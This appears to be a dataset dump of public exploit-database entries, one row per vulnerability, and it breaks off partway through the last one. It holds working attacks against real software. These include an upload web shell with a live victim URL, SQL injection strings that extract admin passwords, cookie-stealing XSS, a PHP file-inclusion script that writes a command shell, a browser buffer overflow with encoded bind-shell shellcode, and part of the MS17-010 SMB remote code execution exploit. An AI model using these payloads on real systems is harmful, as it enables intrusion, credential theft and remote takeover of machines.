8132,"Access2asp - 'imageLibrar' Arbitrary File Upload                          ||          ||   | ||                            o_,_7 _||  . _o_7 _|| 4_|_||  o_w_,                   ( :   /    (_)    /           (   .     ################################################################ #           upload shell # #           Found by ::: mr.al7rbi # #           Contact  ::: n16 [at] live.com # #           my Group ::: islam-defenders Team # ################################################################   [+] Title: imageLibrary   [dork]  inurl:""default_Image.asp""  [+] EXPLOITS:  http://www.site.com/imageLibrary//admin/images/default_Image.asp  [exp:]    http://www.davidhalpernmd.com/manage_tbps/default_Image.asp  [demo]  ]http://www.access2asp.com/imageLibraryDemo/admin/images/default_Image.asp  [shell be like ]  http://www.access2asp.com/imageLibraryDemo/admin/images/win.asp   [+] Special  Greetz for :  www.sec-code.com  [+] Greetz : MaTrEx  & samkmk.almkkar & 3lo0osh  &  ili The General ili & Super-Code & BxH &all tryag members & all muslims  # milw0rm.com [2009-03-02]","[""'imageLibrar'""]",1
6273,"SunShop Shopping Cart 4.1.4 - 'id' SQL Injection ########################################################## # GulfTech Security Research              August 18, 2008 ########################################################## # Vendor : Turnkey Web Tools, Inc # URL : http://www.turnkeywebtools.com # Version : SunShop <= 4.1.4 # Risk : SQL Injection ##########################################################   Description: SunShop shopping cart is a full featured ecommerce solution written in php that allows for web masters to run their own online ecommerce operation. Unfortunately there are a number of SQL Injection issues in SunShop that allow for an attacker to have arbitrary access to the SunShop database where they can access information such as customer and administrator details. An updated version of SunShop has been released to address these issues, and users should upgrade soon.    SQL Injection: There are quite a few SQL Injection issues within SunShop that for an attacker to have arbitrary access to the SunShop database. The first example we will have a look at is in class.ajax.php @ lines 348-362  function edit_registry ($id="""") {     global $DB_site, $dbprefix, $settings, $lang, $sess;     $data = $DB_site->query_first(""SELECT * FROM `"".$dbprefix.""users_registry`     WHERE id='"".$_POST[id].""' AND userid='"".$sess->gvar('userid').""'"");     $data = filter_data($data);     $out  = 'document.getElementById(\'wishform\').style.display = \'none\';';     $out .= 'document.getElementById(\'wisheditform\').style.display = \'block\';';     $out .= 'form = document.forms[\'edit_registry\'];';     $out .= 'form.elements[\'event[id]\'].value = \''.js_clean($data[id]).'\';';     $out .= 'form.elements[\'event[name]\'].value = \''.js_clean($data[name]).'\';';     $out .= 'form.elements[\'event[desc]\'].value = \''.js_clean($data[description]).'\';';     $out .= 'form.elements[\'event[month]\'].selectedIndex = '.(date('m',     strtotime($data['date']))-1).';';     $out .= 'form.elements[\'event[day]\'].selectedIndex = '.(date('d',     strtotime($data['date']))-1).';';     $out .= 'form.elements[\'event[year]\'].selectedIndex = '.((date('Y',     strtotime($data['date'])))-date('Y')).';';     return $out; }  As seen above the SQL Injection issue here is pretty straight forward and is a result of a $_POST variable being used in the middle of the query. An attacker could exploit this SQL Injection issue by making a post request to ""/index.php?l=edit_registry&p=1"" with the following post data.  id=-99' UNION SELECT 1,2,3,concat(username,char(58),password),5,6 FROM ss_users/*  Upon successful exploitation an attacker would be presented with the targeted credentials. In addition to this SQL Injection are several more SQL Injection issues within class.ajax.php and can be found at lines 77, 113, 138 (via the check_email() function), 349, 374, and 400. With the exception of the issue @ line 138 these issues are very easily identified as they use GPC variables directly within SQL queries.    Solution: The TurnKeyWebTools developers have addressed these issues in the latest version of SunShop which can be found at the following url.  http://www.turnkeywebtools.com/esupport/index.php?_m=news&_a=viewnews&newsid=63   Credits: James Bercegay of the GulfTech Security Research Team    Related Info: The original advisory can be found at the following location http://www.gulftech.org/?node=research&article_id=00125-08182008  # milw0rm.com [2008-08-19]","['ajax.php ', 'index.php?']",1
5804,"Pre ADS Portal 2.0 - SQL Injection ____________________   ___ ___ ________ \_   _____/\_   ___ \ /   |   \\_____  \    |    __)_ /    \  \//    ~    \/   |   \   |        \\     \___\    Y    /    |    \ /_______  / \______  /\___|_  /\_______  /         \/         \/       \/         \/                                           .OR.ID ECHO_ADV_98$2008  ----------------------------------------------------------------------------------------- [ECHO_ADV_98$2008] Pre Ads Portal <= 2.0 Sql Injection Vulnerability -----------------------------------------------------------------------------------------  Author         : M.Hasran Addahroni Date           : June, 13 th 2008 Location       : Jakarta, Indonesia Web            : http://e-rdc.org/v1/news.php?readmore=98 Critical Lvl   : Medium Impact	       : System access Where	       : From Remote ---------------------------------------------------------------------------  Affected software description: ~~~~~~~~~~~~~~~~~~~~~~~~~~~  Application   : Pre Ads Portal version       : <= 2.0 Vendor        : http://www.preproject.com/ads.asp Description   :  Pre ADS Portal is a Web Application which is used to submit your personal listings into different categories. You can add your's Listings into the following categories or can also add, edit and delete categories and sub categories from admin section. Pre ADS Portal fully customizable website for ads submission solution with golden and featured listings features.  During submission users can make their ads golden or featured listed and webmaster can add packages for monthly payments against these features. 2Checkout and PAYPAL have been integrated to this portal system. We have tried to make script completely resembles to Businessesforsale.com, hotscripts.com and mostly advanced classifieds websites. Blows are the main features or a kind of manual of our Pre ADS Portal.  ---------------------------------------------------------------------------  Vulnerability: ~~~~~~~~~~~~~  Input passed to the ""cid"" parameter in showcategory.php page and ""id"" parameter in software-description.php are not properly verified before being used to sql query.  This can be exploited thru the browser and get password from admin in plain text. Successful exploitation requires that ""magic_quotes"" is off.   Poc/Exploit: ~~~~~~~~~  http://www.target.com/[path]/showcategory.php?cid=-1%20union%20select%201,concat(id,0x3a,admin_name,0x3a,pwd),3,4,5,6%20from%20sbwmd_admin-- http://www.target.com/[path]/software-description.php?id=-1%20union%20select%201,2,concat(id,0x3a,admin_name,0x3a,pwd),4,5,6,7,8,9,0,1,2,3,4,5,6,7,8,9,0,1,2,3,4,5,6,7,8,9,0,1%20from%20sbwmd_admin--  Dork: ~~~~ altavista : ""home | login | register | feedback | link to us | submit Listing | advertise""   Solution: ~~~~~~  - Edit the source code to ensure that input is properly verified. - Turn on magic_quotes in php.ini    Timeline: ~~~~~~~~  - 10 - 06 - 2008 bug found - 13 - 06 - 2008 vendor contacted - 13 - 06 - 2008 advisory released ---------------------------------------------------------------------------  Shoutz: ~~~~ ~ ping - my dearest wife, zautha my little warrior ""happy birthday, dear"" ~ y3dips,the_day,moby,comex,z3r0byt3,c-a-s-e,S`to,lirva32,pushm0v,az01,negative,the_hydra,neng chika, str0ke ~ everybody [at] SCAN-NUSANTARA and SCAN-ASSOSIATES ~ masterpop3,maSter-oP,Lieur-Euy,Mr_ny3m,bithedz,murp,sakitjiwa,x16,an0maly,cybertank,super_temon,b120t0,inggar,fachri,adi,rahmat,indra,cyb3rh3b ~ dr188le,SinChan,h4ntu,cow_1seng,poniman_coy,paman_gembul,ketut,rizal,cR4SH3R,kuntua,stev_manado,nofry,k1tk4t,0pt1c ~ newbie_hacker@yahoogroups.com ~ #aikmel #e-c-h-o @irc.dal.net  --------------------------------------------------------------------------- Contact: ~~~~~       K-159 || echo|staff || eufrato[at]gmail[dot]com      Homepage: http://www.e-rdc.org/  -------------------------------- [ EOF ] ----------------------------------  # milw0rm.com [2008-06-13]",['showcategory.php '],1
5049,"FaceBook PhotoUploader - 'ImageUploader4.ocx 4.5.57.0' Remote Buffer Overflow <!--  FaceBook PhotoUploader Buffer Overflow Exploit written by e.b.  Tested on Windows XP SP2(fully patched) English, IE6, ImageUploader4.ocx 4.5.57.0(FaceBookPhotoUploader2.cab) The following controls are also vulnerable:  Aurigma ImageUploader4 4.5.70.0 and 4.5.126.0 ----------------------------- {6E5E167B-1566-4316-B27F-0DDAB3484CF7} Buffer Offset: 289  Aurigma ImageUploader4 4.6.17.0 ----------------------------- {6E5E167B-1566-4316-B27F-0DDAB3484CF7} Buffer Offset: 261  Aurigma ImageUploader5 5.0.10.0  ------------------------------- {BA162249-F2C5-4851-8ADC-FC58CB424243} Buffer Offset: 261  Thanks to h.d.m. and the Metasploit crew  --> <html>  <head>   <title>FaceBook PhotoUploader Buffer Overflow Exploit</title>   <script language=""JavaScript"" defer>     function Check() {            var buf = unescape(""%u4141"");       while (buf.length <= 261) buf = buf + unescape(""%u4141"");   // win32_exec -  EXITFUNC=seh CMD=c:\windows\system32\calc.exe Size=378 Encoder=Alpha2 http://metasploit.com  var shellcode1 = unescape(""%u03eb%ueb59%ue805%ufff8%uffff%u4949%u4949%u4949"" +                           ""%u4948%u4949%u4949%u4949%u4949%u4949%u5a51%u436a"" +                           ""%u3058%u3142%u4250%u6b41%u4142%u4253%u4232%u3241"" +                           ""%u4141%u4130%u5841%u3850%u4242%u4875%u6b69%u4d4c"" +                           ""%u6338%u7574%u3350%u6730%u4c70%u734b%u5775%u6e4c"" +                           ""%u636b%u454c%u6355%u3348%u5831%u6c6f%u704b%u774f"" +                           ""%u6e68%u736b%u716f%u6530%u6a51%u724b%u4e69%u366b"" +                           ""%u4e54%u456b%u4a51%u464e%u6b51%u4f70%u4c69%u6e6c"" +                           ""%u5964%u7350%u5344%u5837%u7a41%u546a%u334d%u7831"" +                           ""%u4842%u7a6b%u7754%u524b%u6674%u3444%u6244%u5955"" +                           ""%u6e75%u416b%u364f%u4544%u6a51%u534b%u4c56%u464b"" +                           ""%u726c%u4c6b%u534b%u376f%u636c%u6a31%u4e4b%u756b"" +                           ""%u6c4c%u544b%u4841%u4d6b%u5159%u514c%u3434%u4a44"" +                           ""%u3063%u6f31%u6230%u4e44%u716b%u5450%u4b70%u6b35"" +                           ""%u5070%u4678%u6c6c%u634b%u4470%u4c4c%u444b%u3530"" +                           ""%u6e4c%u6c4d%u614b%u5578%u6a58%u644b%u4e49%u6b6b"" +                           ""%u6c30%u5770%u5770%u4770%u4c70%u704b%u4768%u714c"" +                           ""%u444f%u6b71%u3346%u6650%u4f36%u4c79%u6e38%u4f63"" +                           ""%u7130%u306b%u4150%u5878%u6c70%u534a%u5134%u334f"" +                           ""%u4e58%u3978%u6d6e%u465a%u616e%u4b47%u694f%u6377"" +                           ""%u4553%u336a%u726c%u3057%u5069%u626e%u7044%u736f"" +                           ""%u4147%u4163%u504c%u4273%u3159%u5063%u6574%u7035"" +                           ""%u546d%u6573%u3362%u306c%u4163%u7071%u536c%u6653"" +                           ""%u314e%u7475%u7038%u7765%u4370"");  // win32_bind -  EXITFUNC=seh LPORT=4444 Size=696 Encoder=Alpha2 http://metasploit.com  var shellcode2 = unescape(""%u03eb%ueb59%ue805%ufff8%uffff%u4949%u4949%u4949"" +                           ""%u4949%u4949%u4949%u4949%u4949%u4937%u5a51%u436a"" +                           ""%u3058%u3142%u4150%u6b42%u4141%u4153%u4132%u3241"" +                           ""%u4142%u4230%u5841%u3850%u4241%u7875%u4b69%u724c"" +                           ""%u584a%u526b%u4a6d%u4a48%u6b59%u6b4f%u694f%u416f"" +                           ""%u4e70%u526b%u744c%u4164%u6e34%u376b%u5535%u4c6c"" +                           ""%u714b%u646c%u6145%u7468%u6a41%u6e4f%u626b%u326f"" +                           ""%u6c38%u334b%u376f%u5550%u7851%u316b%u6c59%u504b"" +                           ""%u6e34%u466b%u6861%u456e%u6f61%u6c30%u6c59%u6b6c"" +                           ""%u3934%u4150%u3764%u6877%u6941%u565a%u636d%u4b31"" +                           ""%u7872%u6c6b%u7534%u566b%u3134%u5734%u5458%u6b35"" +                           ""%u6e55%u336b%u556f%u7474%u7841%u416b%u4c76%u464b"" +                           ""%u626c%u6e6b%u416b%u354f%u564c%u6861%u666b%u3663"" +                           ""%u6c4c%u6b4b%u7239%u444c%u5764%u616c%u4f71%u4733"" +                           ""%u6b41%u336b%u4c54%u634b%u7073%u6c30%u534b%u6470"" +                           ""%u6c4c%u724b%u4550%u4e4c%u6c4d%u374b%u7530%u7358"" +                           ""%u426e%u4c48%u524e%u466e%u586e%u566c%u3930%u586f"" +                           ""%u7156%u4676%u7233%u6346%u3058%u7033%u3332%u5458"" +                           ""%u5237%u4553%u5162%u504f%u4b54%u5a4f%u3370%u6a58"" +                           ""%u686b%u596d%u456c%u466b%u4930%u596f%u7346%u4e6f"" +                           ""%u5869%u7365%u4d56%u5851%u366d%u6468%u7242%u7275"" +                           ""%u674a%u5972%u6e6f%u7230%u4a48%u5679%u6b69%u6e45"" +                           ""%u764d%u6b37%u584f%u3356%u3063%u5053%u7653%u7033"" +                           ""%u3353%u5373%u3763%u5633%u6b33%u5a4f%u3270%u5046"" +                           ""%u3568%u7141%u304c%u3366%u6c63%u6d49%u6a31%u7035"" +                           ""%u6e68%u3544%u524a%u4b50%u7177%u4b47%u4e4f%u3036"" +                           ""%u526a%u3130%u7041%u5955%u6e6f%u3030%u6c68%u4c64"" +                           ""%u546d%u796e%u3179%u5947%u596f%u4646%u6633%u6b35"" +                           ""%u584f%u6350%u4b58%u7355%u4c79%u4146%u6359%u4b67"" +                           ""%u784f%u7656%u5330%u4164%u3344%u7965%u4e6f%u4e30"" +                           ""%u7173%u5878%u6167%u6969%u7156%u6269%u3977%u6a6f"" +                           ""%u5176%u4945%u4e6f%u5130%u5376%u715a%u7274%u6246"" +                           ""%u3048%u3063%u6c6d%u5a49%u6345%u625a%u7670%u3139"" +                           ""%u5839%u4e4c%u4d69%u5337%u335a%u4e74%u4b69%u5652"" +                           ""%u4b51%u6c70%u6f33%u495a%u336e%u4472%u6b6d%u374e"" +                           ""%u7632%u6e4c%u6c73%u704d%u767a%u6c58%u4e6b%u4c4b"" +                           ""%u736b%u5358%u7942%u6d6e%u7463%u6b56%u304f%u7075"" +                           ""%u4b44%u794f%u5346%u706b%u7057%u7152%u5041%u4251"" +                           ""%u4171%u337a%u4231%u4171%u5141%u6645%u6931%u5a6f"" +                           ""%u5070%u6e68%u5a4d%u5679%u6865%u334e%u3963%u586f"" +                           ""%u6356%u4b5a%u4b4f%u704f%u4b37%u4a4f%u4c70%u614b"" +                           ""%u6b47%u4d4c%u6b53%u3174%u4974%u596f%u7046%u5952"" +                           ""%u4e6f%u6330%u6c58%u6f30%u577a%u6174%u324f%u4b73"" +                           ""%u684f%u3956%u386f%u4350"");   		var next_seh_pointer = unescape(""%u06EB%u9090""); //2 byte jump 		 		//oleacc.dll Windows XP SP2 English 0x74C96950 pop ebp - pop - retbis     		//no SafeSEH 		var seh_handler = unescape(""%u6950%u74C9"");  	 		var nop = unescape(""%u9090%u9090%u9090%u9090%u9090%u9090"");  		var m = buf + next_seh_pointer + seh_handler + nop + shellcode1 + nop; 		 		obj.ExtractIptc = m; 		//obj.ExtractExif = m;     		     }         </script>   </head>  <body onload=""JavaScript: return Check();"">     <object id=""obj"" classid=""clsid:5C6698D9-7BE4-4122-8EC5-291D84DBD4A0"">      Unable to create object     </object>  </body> </html>  # milw0rm.com [2008-02-03]","[""'ImageUploader4.ocx""]",1
14684,"Open-Realty 2.5.7 - Local File Disclosure <?php /*  * Exploit Title:   * Date: 2010-08-18  * Author: Nikola Petrov  * Vendor: http://open-realty.org/  * Version: 2.5.7  */ 	/* 		vulnerable: Open-Realty 2.5.7 		LFI: /index.php 		 		upload image with: <?php system(""echo \""<?php if(isset(\$_GET[\""cmd\""])) system(\$_GET[\""cmd\""]); ?>\"" > sh.php""); ?> 		include the image and sh.php will be generated. 		proceed with sh.php  		MAGIC_QUOTES must be 'off' and %00 must not be replaced with \0. 	*/  	print ""\n\n#########################################################################\n""; 	print ""#LFI discovery and implementation: Nikola Petrov (vp.nikola@gmail.com)\n""; 	print ""#Date: 05.09.2009\n""; 	print ""#########################################################################\n\n"";  	if($argc < 5) { 		print ""usage: $argv[0] host port path file [debug: 1/0]\n""; 		print ""example: $argv[0] localhost 80 / ../../../../../../../../../../../../etc/passwd\n\n\n""; 		exit(); 	}  	$Host = $argv[1]; 	$Port = $argv[2]; 	$Path = $argv[3]; 	$File = $argv[4];  	function HttpSend($aHost, $aPort, $aPacket) { 		$Response = """";  		if(!$Socket = fsockopen($aHost, $aPort)) { 			print ""Error connecting to $aHost:$aPort\n\n""; 			exit(); 		} 		 		fputs($Socket, $aPacket); 		 		while(!feof($Socket)) $Response .= fread($Socket, 1024); 		 		fclose($Socket); 		 		return $Response; 	}  	$VulnRequest = ""select_users_lang="". $File . ""%00""; 	 	$Packet  = ""POST {$Path} HTTP/1.1\r\n""; 	$Packet .= ""Host: {$Host}\r\n""; 	$Packet .= ""Content-Type: application/x-www-form-urlencoded\r\n""; 	$Packet .= ""Content-Length: "" . strlen($VulnRequest) . ""\r\n\r\n""; 	$Packet .= ""$VulnRequest\n"";  	if($argv[5] == 1) print $Packet;  	print HttpSend($Host, $Port, $Packet); ?>",['sh.php '],1
39344,"OL-Commerce - '/OL-Commerce/affiliate_show_banner.php?affiliate_banner_id' SQL Injection source: https://www.securityfocus.com/bid/68719/info   ol-commerce is prone to multiple SQL-injection vulnerabilities and multiple cross-site scripting vulnerabilities because it fails to sufficiently sanitize user-supplied input.   Exploiting these vulnerabilities could allow an attacker to steal cookie-based authentication credentials, compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.   ol-commerce 2.1.1 is vulnerable; other versions may also be affected.    http://www.example.com/OL-Commerce/affiliate_show_banner.php?ref=1&affiliate_banner_id=1[SQL INJECTION]","[""'/OL-Commerce/affiliate_show_banner.php?affiliate_banner_id'""]",1
34660,"x10 MP3 Automatic Search Engine 1.6.5b - 'embed.php?name' Cross-Site Scripting source: https://www.securityfocus.com/bid/43336/info      x10 Media Automatic MP3 Search Engine is prone to multiple cross-site scripting vulnerabilities because it fails to properly sanitize user-supplied input.      An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials and to launch other attacks.      x10 Media Automatic MP3 Search Engine 1.6.5 is vulnerable; other versions may also be affected.   http://www.example.com/embed.php?name=""><script>alert(document.cookie);</script>","[""'embed.php?name'""]",1
11402,"Books/eBooks Rental Software - SQL Injection /**************************************************************************  [!] Books/eBooks Rental Software SQL injection Vulnerability [!] Author	: Don Tukulesto (root@indonesiancoder.com) [!] Homepage	: http://www.indonesiancoder.com [!] Date & Time	: Thu Feb 10, 2010 5:55 PM [!] Rock On	: http://antisecradio.fm (choose your weapon)  **************************************************************************/  [ Software Information ]  [+] Vendor : http://www.commodityrentals.com/ [+] This script is specifically tailored for people wanting to start a Books/E-Books Rentals Business within a very short time.     Fully E-Commerce ready, this system comes with a Books attribute template and a fully customizable ""look and feel"" template of the site. [+] Method : SQL Injection [+] Dork : Don Tukulesto  ===========================================================================  [ Proof of Concept ]  http://server/index.php?view=gamecatalog&cat_id=[INDONESIAN CODER NOT DEAD WITHOUT YOU]  [ EXPL0!T ]  2+AND+1=2+UNION+SELECT+0,1,concat(admin_name,0x3a,admin_password),3+from+rental_admin--  [ D3M0 ]  http://server/index.php?view=gamecatalog&cat_id=2+AND+1=2+UNION+SELECT+0,1,concat(admin_name,0x3a,admin_password),3+from+rental_admin--  ===========================================================================  [ Remember the Name ]  [>] INDONESIAN CODER TEAM - KILL-9 CREW - MainHack Brotherhood - ServerIsDown - SurabayaHackerLink [>] kaMtiEz ~ M3NW5 ~ M364TR0N ~ Gonzhack ~ CYB3R_TR0N ~ DEESSAINT ~ ran ~ Arianom ~ Contrex [>] Jack- ~ Yadoy666 ~ s4va ~ senot ~ Bayu5154 ~ VYC0D ~ Tucker ~ Ian Petrucii ~ Ronz & FeeLCoMz [>] kecemplungkalen ~ DraCoola Multimedia ~ XNITRO ~ rey_cute ~ Awan Bejat ~ Plaque ~ Gh4mb4s [>] Pathloader ~ tiw0L ~ Mboys ~ cimpli ~ d0ntcry ~ mbamboenk family ~ YOU !!!  [ rm -rf yourself ]   [>] FOR MALINGSIAL   [ some quotes ]  For FAKE Don Tukulesto on Facebook : http://www.facebook.com/profile.php?id=100000563647147 I know you don't like me, but do u know what ? YOU ARE A LOSER. lmao",['index.php?'],1
34874,"Skybluecanvas 1.1 r237 - 'admin.php' Multiple Cross-Site Scripting Vulnerabilities source: https://www.securityfocus.com/bid/44225/info  SkyBlueCanvas is prone to multiple cross-site scripting vulnerabilities because it fails to properly sanitize user-supplied input.  An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may let the attacker steal cookie-based authentication credentials and launch other attacks.  SkyBlueCanvas 1.1 r237 is vulnerable; other versions may also be affected.   http://www.example.com/skybluecanvas/admin.php?mgroup=pages&mgr=page&objtype=XSS http://www.example.com/skybluecanvas/admin.php?mgroup=settings&mgr=configuration&objtyp e="">XSS http://www.example.com/skybluecanvas/admin.php?mgroup=pages&mgr=page&objtype=page&sub=e ditpage&id="" onfocus=alert(0) > http://www.example.com/skybluecanvas/admin.php?mgroup=pictures&mgr=media&dir=&#039;XSS","[""'admin.php'""]",1
41987,"Microsoft Windows Server 2008 R2 (x64) - 'SrvOs2FeaToNt' SMB Remote Code Execution (MS17-010) # Exploit Author: Juan Sacco <juan.sacco@kpn.com> at KPN Red Team - http://www.kpn.com   # Date and time of release: May, 9 2017 - 13:00PM  # Found this and more exploits on my open source security project: http://www.exploitpack.com  # # MS17-010 - https://technet.microsoft.com/en-us/library/security/ms17-010.aspx # Tested on: Microsoft Windows Server 2008 x64 SP1 R2 Standard  # # Description: SMBv1 SrvOs2FeaToNt OOB is prone to a remote code execution # vulnerability because the application fails to perform adequate # boundary-checks on user-supplied input. Srv.sys process SrvOs2FeaListSizeToNt  # and when the logic is not correct it leads to a cross-border copy. The vulnerability trigger point is as follows: # # Vulnerable code: # unsigned int __fastcall SrvOs2FeaToNt(int a1, int a2) # { #   int v4; // edi@1 #   _BYTE *v5; // edi@1 #   unsigned int result; // eax@1 #  #   v4 = a1 + 8; #   *(_BYTE *)(a1 + 4) = *(_BYTE *)a2; #   *(_BYTE *)(a1 + 5) = *(_BYTE *)(a2 + 1); #   *(_WORD *)(a1 + 6) = *(_WORD *)(a2 + 2); #   _memmove((void *)(a1 + 8), (const void *)(a2 + 4), *(_BYTE *)(a2 + 1)); #   v5 = (_BYTE *)(*(_BYTE *)(a1 + 5) + v4); #   *v5++ = 0; #   _memmove(v5, (const void *)(a2 + 5 + *(_BYTE *)(a1 + 5)), *(_WORD *)(a1 + 6)); #   result = (unsigned int)&v5[*(_WORD *)(a1 + 6) + 3] & 0xFFFFFFFC; #   *(_DWORD *)a1 = result - a1; #   return result; # } # # Impact: An attacker could exploit this vulnerability to execute arbitrary code in the # context of the application. Failed exploit attempts could result in a # denial-of-service condition. # # Timeline: # 04/05/2017 - Research started # 04/05/2017 - First PoC using original code # 05/05/2017 - Kernel debugging on Windows 2008 # 05/05/2017 - Exploit code first draft # 06/05/2017 - Functional PoC # 07/05/2017 - Added support for Zerosum0x0 shellcode # 08/05/2017 - Code revisited and bugs fixed # 09/05/2017 - First successful shell # 09/05/2017 - Exploit tested in QA Laba # 09/05/2017 - Exploit code final review # 09/05/2017 - Publish # # Vendor homepage: http://www.microsoft.com # This exploit is a port from the amazing work made by Risksense. Checkout the original project at: https://github.com/RiskSense-Ops/MS17-010 # Credits: @EquationGroup @ShadowBrokers @progmboy @zerosum0x0 @juansacco  # # How to run: python3 ms17010.py ipaddress # import sys import socket import time import ast import binascii import os  def mod_replay():     datfile = [""('connect', 1, 0.0)"", ""('send', 1, b'\\x00\\x00\\x00\\x85\\xffSMBr\\x00\\x00\\x00\\x00\\x18S\\xc0\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xff\\xfe\\x00\\x00@\\x00\\x00b\\x00\\x02PC NETWORK PROGRAM 1.0\\x00\\x02LANMAN1.0\\x00\\x02Windows for Workgroups 3.1a\\x00\\x02LM1.2X002\\x00\\x02LANMAN2.1\\x00\\x02NT LM 0.12\\x00', 0.0)"", ""('recv', 1, 0.0)"", ""('send', 1, b'\\x00\\x00\\x00\\x88\\xffSMBs\\x00\\x00\\x00\\x00\\x18\\x07\\xc0\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xff\\xfe\\x00\\x00@\\x00\\r\\xff\\x00\\x88\\x00\\x04\\x11\\n\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xd4\\x00\\x00\\x00K\\x00\\x00\\x00\\x00\\x00\\x00W\\x00i\\x00n\\x00d\\x00o\\x00w\\x00s\\x00 \\x002\\x000\\x000\\x000\\x00 \\x002\\x001\\x009\\x005\\x00\\x00\\x00W\\x00i\\x00n\\x00d\\x00o\\x00w\\x00s\\x00 \\x002\\x000\\x000\\x000\\x00 \\x005\\x00.\\x000\\x00\\x00\\x00', 0.0)"", ""('recv', 1, 'userid', 0.0)"", ""('send', 1, b'\\x00\\x00\\x00X\\xffSMBu\\x00\\x00\\x00\\x00\\x18\\x07\\xc0\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xff\\xfe__USERID__PLACEHOLDER__@\\x00\\x04\\xff\\x00X\\x00\\x08\\x00\\x01\\x00-\\x00\\x00\\\\\\x00\\\\\\x001\\x007\\x002\\x00.\\x001\\x006\\x00.\\x009\\x009\\x00.\\x005\\x00\\\\\\x00I\\x00P\\x00C\\x00$\\x00\\x00\\x00?????\\x00', 0.0)"", ""('recv', 1, 'treeid', 0.0)"", ""('send', 1, b'\\x00\\x00\\x048\\xffSMB\\xa0\\x00\\x00\\x00\\x00\\x18\\x07\\xc0\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00__TREEID__PLACEHOLDER__\\xff\\xfe__USERID__PLACEHOLDER__@\\x00\\x14\\x01\\x00\\x00\\x1e\\x00\\x00\\x00\\xd0\\x03\\x01\\x00\\x1e\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x1e\\x00\\x00\\x00K\\x00\\x00\\x00\\xd0\\x03\\x00\\x00h\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\xec\\x03\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x